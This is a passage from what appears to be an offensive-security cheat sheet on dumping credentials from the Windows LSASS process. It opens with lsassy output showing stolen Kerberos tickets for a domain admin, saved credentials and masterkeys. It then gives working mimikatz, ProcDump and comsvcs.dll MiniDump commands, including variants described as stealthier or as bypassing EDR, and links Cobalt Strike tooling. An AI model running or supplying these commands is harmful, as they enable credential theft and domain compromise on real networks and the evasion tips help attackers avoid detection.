					SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_53b91a0b.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_53b91a0b.kirbi)
					SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_375a9e7f.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_375a9e7f.kirbi)
					SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:13 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_6e2f1491.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:13 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_6e2f1491.kirbi)
					SUCCESS:root:DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_a88b0199.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_a88b0199.kirbi)
					SUCCESS:root:DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_8b453c42.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_8b453c42.kirbi)
					SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_4e7fda28.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_4e7fda28.kirbi)
					SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_824abab7.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_824abab7.kirbi)
					SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:01 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_035c7523.kirbi)
					[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:01 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_035c7523.kirbi)
					SUCCESS:root:Credentials saved to outfile.txt
					[+] 10.0.0.60 Credentials saved to outfile.txt
					SUCCESS:root:25 Kerberos tickets written to /root/lsassy/Kerberos
					[+] 10.0.0.60 25 Kerberos tickets written to /root/lsassy/Kerberos
					SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
					[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt

#### From a Windows Machine
##### Local
* <details><summary>mimikatz (Click to expand)</summary><p>

		sekurlsa::minidump lsass.DMP
		log lsass.txt
		sekurlsa::logonPasswords
* <details><summary>Windows Task Manager (GUI) (Click to expand)</summary><p>
	* Process
		1. Open the Task Manager GUI
		1. Select the **Details** tab
		1. Right-click `lsass.exe` and select **Create dump file**
			* The file is sent to the user’s `AppData\Local\Temp` directory
* <details><summary>ProcDump (Click to expand)</summary><p>
	* Examples
		* Example 1: Regular use

				procdump.exe -accepteula -ma lsass.exe out.dmp
		* Example 2: Stealthier, refer to lsass by pid
			1. Identify lsass pid using PowerShell

					tasklist | findstr lsass
			1. Run procdump with the lsass pid

					procdump.exe -accepteula -ma 580 out.dmp
		* Example 3: Use quotes around lsass to bypass EDR
			
				procdump.exe -accepteula -ma “lsass.exe” out.dmp
* <details><summary>comsvcs (Click to expand)</summary><p>

		C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
	* Normally triggers Windows Defender

* <details><summary>HiveNightmare (Click to expand) -<br />[https://github.com/GossiTheDog/HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)</summary><p>

##### Remote



#### From a C2 (e.g., Beacon Object Files)
* <details><summary>nanodump (Click to expand)-<br />[https://github.com/helpsystems/nanodump](https://github.com/helpsystems/nanodump)</summary><p>
	* Beacon Object File (BOF) for CobaltStrike

### Needs Research

* [https://twitter.com/icyguider/status/1462435172419260420](https://twitter.com/icyguider/status/1462435172419260420)